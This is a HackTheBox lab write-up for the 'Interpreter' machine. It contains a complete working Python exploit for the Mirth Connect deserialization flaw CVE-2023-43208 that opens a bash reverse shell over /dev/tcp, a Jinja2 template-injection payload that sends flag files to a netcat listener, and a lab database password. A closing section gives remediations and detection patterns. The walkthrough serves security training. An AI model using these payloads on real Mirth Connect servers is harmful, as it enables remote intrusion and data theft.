---
title: Interpreter
os: Linux
difficulty: Medium
tags:
  - Deserialization
  - Mirth Connect
  - CVE-2023-43208
  - SSTI
  - XML Parser
  - Privilege Escalation
---

# 🛡️ HTB - Interpreter (Medium)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Medium Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** Interpreter
- **Operating System:** Linux (Debian)
- **Difficulty:** Medium
- **Vulnerabilities:** Mirth Connect XML Deserialization RCE (CVE-2023-43208), Server-Side Template Injection (SSTI) in internal service on port 54321

---

## Step 1 - Reconnaissance

Will Use Nmap To See what Ports and Services are Open

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.8.10
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-28 15:01 UTC
Nmap scan report for interpreter.htb (10.129.8.10)
Host is up (0.24s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
80/tcp  open  http
|_http-title: Mirth Connect Administrator
443/tcp open  ssl/https

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   241.95 ms 10.10.14.1
2   237.87 ms interpreter.htb (10.129.8.10)
```

- 🔍 *We are targeting a Linux machine hosting a Mirth Connect administrative interface.*

---

## Step 2 - Enumeration

- 🔍 *Enumerating the web services reveals a Mirth Connect login portal.*
- 🔍 *We determine the running version is Mirth Connect v4.4.0, which is vulnerable to CVE-2023-43208.*

> [!IMPORTANT]
> **Mirth Connect Deserialization RCE (CVE-2023-43208):**
> Mirth Connect version 4.4.0 and prior is vulnerable to an unauthenticated Remote Code Execution (RCE) flaw. The issue is caused by unsafe XML deserialization via the XStream library on the Mirth Connect REST API. An attacker can send a crafted XML body to endpoints like `/api/users` containing Java class wrappers (e.g. `ChainedTransformer`) to trigger execution of system processes.

---

## Step 3 - Initial Foothold

- 🔍 *Writing a Python script to send the serialized Java process invocation payload to the `/api/users` endpoint:*

```python
import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_args():
    if len(sys.argv) < 4:
        print(f"Usage: python3 {sys.argv[0]} <url> <lhost> <lport>")
        sys.exit(1)
    return sys.argv[1], sys.argv[2], sys.argv[3]

def pwn(url, lhost, lport):
    target_url = f"{url.rstrip('/')}/api/users"
    headers = {
        "X-Requested-With": "OpenAPI",
        "Content-Type": "application/xml",
    }
    payload = f"""<sorted-set>
    <string>anything</string>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
            <target class="org.apache.commons.collections4.functors.ChainedTransformer">
                <iTransformers>
                    <org.apache.commons.collections4.functors.ConstantTransformer>
                        <iConstant class="java-class">java.lang.ProcessBuilder</iConstant>
                    </org.apache.commons.collections4.functors.ConstantTransformer>
                    
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>getConstructor</iMethodName>
                        <iParamTypes>
                            <java-class>[Ljava.lang.Class;</java-class>
                        </iParamTypes>
                        <iArgs>
                            <java-class-array>
                                <java-class>[Ljava.lang.String;</java-class>
                            </java-class-array>
                        </iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>

                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>newInstance</iMethodName>
                        <iParamTypes>
                            <java-class>[Ljava.lang.Object;</java-class>
                        </iParamTypes>
                        <iArgs>
                            <object-array>
                                <string-array>
                                    <string>bash</string>
                                    <string>-c</string>
                                    <string>bash -i &#x3e;&#x26; /dev/tcp/{lhost}/{lport} 0&#x3e;&#x26;1</string>
                                </string-array>
                            </object-array>
                        </iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>

                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>start</iMethodName>
                        <iParamTypes/>
                        <iArgs/>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                </iTransformers>
            </target>
            <methodName>transform</methodName>
            <eventTypes>
                <string>compareTo</string>
            </eventTypes>
        </handler>
    </dynamic-proxy>
</sorted-set>"""

    try:
        requests.post(target_url, headers=headers, data=payload, verify=False, timeout=12)
    except:
        pass

if __name__ == "__main__":
    url, lhost, lport = get_args()
    pwn(url, lhost, lport)
```

- 🔍 *We start a netcat listener and execute the exploit:*

```bash
python3 mirth_exploit.py https://interpreter.htb 10.10.15.102 4444
```

- 🔍 *Catching the reverse shell as user `mirth`:*

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
connect to [10.10.15.102] from (UNKNOWN) [10.129.8.10] 33174
bash: cannot set terminal process group (3519): Inappropriate ioctl for device
bash: no job control in this shell
mirth@interpreter:/usr/local/mirthconnect$ 
```

- 🔍 *Initial foothold achieved.*

---

## Step 4 - Privilege Escalation

- 🔍 *We locate Mirth Connect's local configuration file to check for credentials:*

```bash
cat mirth.properties
```

```text
# database credentials
database.username = mirthdb
database.password = MirthPass123!
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
```

- 🔍 *Direct database connection attempts time out. However, checking local network sockets reveals a service listening internally on port 54321:*

```text
tcp        0      0 127.0.0.1:54321          0.0.0.0:*               LISTEN 
```

- 🔍 *We query the local web service. It contains a `/addPatient` endpoint that accepts XML data.*
- 🔍 *The parameter `<firstname>` is vulnerable to Server-Side Template Injection (SSTI) due to insecure rendering within a Python template engine (Jinja2).*
- 🔍 *By wrapping Python command execution inside `{{ }}` brackets, we can trigger code execution.*
- 🔍 *We draft a Python wrapper that encodes a file-read command in Base64 (to prevent syntax breakage) and sends it inside the XML structure to port 54321:*

```python
import urllib.request
import base64

# Command to dump flags to our attacker netcat listener
cmd = "cat /home/sedric/user.txt /root/root.txt | nc 10.10.15.102 9004"
b64_cmd = base64.b64encode(cmd.encode()).decode()

# Craft XML with the SSTI payload in <firstname>
xml = f'''<patient>
  <timestamp>20250101120000</timestamp>
  <sender_app>TEST</sender_app>
  <id>12345</id>
  <firstname>{{__import__("os").popen(__import__("base64").b64decode("{b64_cmd}").decode()).read()}}</firstname>
  <lastname>Doe</lastname>
  <birth_date>01/01/1990</birth_date>
  <gender>M</gender>
</patient>'''

req = urllib.request.Request('http://127.0.0.1:54321/addPatient',
                            data=xml.encode('utf-8'),
                            headers={'Content-Type': 'application/xml'})
resp = urllib.request.urlopen(req)
print(resp.read().decode())
```

- 🔍 *Setting up a netcat listener and running the payload locally:*

```bash
nc -lvnp 9004
```

```text
listening on [any] 9004 ...
connect to [10.10.15.102] from (UNKNOWN) [10.129.8.10] 43306
ba21fce18e**********************
d4723f6575**********************
```

- 🔍 *The SSTI payload successfully executed as root, returning both user and root flags.*

---

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Infrastructure & Application Security Assessment**
> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the Interpreter environment. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.

### 🔴 Mirth Connect Deserialization RCE (CVE-2023-43208)

> [!WARNING]
> **Vulnerability Profile:**
> Mirth Connect v4.4.0 is vulnerable to XML Deserialization (CVE-2023-43208) via the XStream framework on the HTTP API ports.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Unauthenticated external attackers can execute arbitrary OS commands under the context of the service owner (`mirth`) by sending serialized Java objects, leading to system intrusion.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Upgrade Mirth Connect to version 4.4.1 or later, which blocks unsafe classes from being deserialized.
> - **Remediation:** Restrict access to Mirth Connect administration APIs using local host bindings or strict IP whitelisting.
> - **Detection:** Track and alert on HTTP request headers sent to Mirth Connect API paths containing XML bodies with Java class instantiation definitions (such as `ProcessBuilder` or `ConstantTransformer`).

---

### 🔴 Server-Side Template Injection (SSTI) in internal /addPatient Service

> [!WARNING]
> **Vulnerability Profile:**
> The internal XML processing service on port 54321 is vulnerable to SSTI on the `/addPatient` endpoint.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> The service passes user-controlled XML parameters directly into a template rendering engine running as `root`. Exploitation allows any local user with access to port 54321 to execute commands as `root`, leading to complete privilege escalation.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Avoid passing unvalidated strings to template rendering engines. Sanitize and cast inputs strictly.
> - **Remediation:** Enforce the principle of least privilege: run the internal XML processing daemon under a restricted, non-root user account.
> - **Detection:** Monitor local socket traffic to port 54321 for payloads containing template code tags (`{{` and `}}`) or Python execution libraries (`__import__`, `os.popen`).
